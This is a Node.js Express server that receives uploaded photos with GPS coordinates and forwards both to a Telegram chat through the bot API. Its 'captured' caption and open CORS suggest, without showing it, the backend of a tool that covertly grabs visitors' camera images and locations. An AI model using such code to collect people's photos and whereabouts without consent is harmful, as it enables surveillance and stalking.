// ✅ CommonJS version of server.js

const express = require('express');
const multer = require('multer');
const fs = require('fs');
const fetch = require('node-fetch');
const FormData = require('form-data');

const app = express();
const upload = multer({ dest: 'uploads/' });

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(express.json());
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

app.post('/upload', upload.single('file'), async (req, res) => {
  try {
    const filePath = req.file?.path;
    const { latitude, longitude } = req.body || {};
    console.log('Received upload:', { latitude, longitude, filePath });

    // 1️⃣ Send the photo to Telegram
    if (filePath) {
      const form = new FormData();
      form.append('chat_id', TELEGRAM_CHAT_ID);
      form.append('photo', fs.createReadStream(filePath));
      form.append('caption', '📸 New photo captured from Nexus Media');

      const photoResp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: form,
      });
      const photoData = await photoResp.json();
      console.log('Photo sent:', photoData);
    }

// 2️⃣ Send clickable map pin to Telegram
if (latitude && longitude) {
  const lat = parseFloat(latitude);
  const lon = parseFloat(longitude);
  const locationUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`;

  const locationResp = await fetch(locationUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      latitude: lat,
      longitude: lon,
    }),
  });

  const locationData = await locationResp.json();
  console.log('Location pin sent:', locationData);
}

    if (filePath) fs.unlink(filePath, () => {});
    res.json({ success: true, message: 'Photo + location sent to Telegram' });
  } catch (err) {
    console.error('Upload error:', err);
    res.status(500).json({ error: 'Failed to send to Telegram' });
  }
});

app.get('/', (req, res) => {
  res.send('📷 Nexus Media backend running...');
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
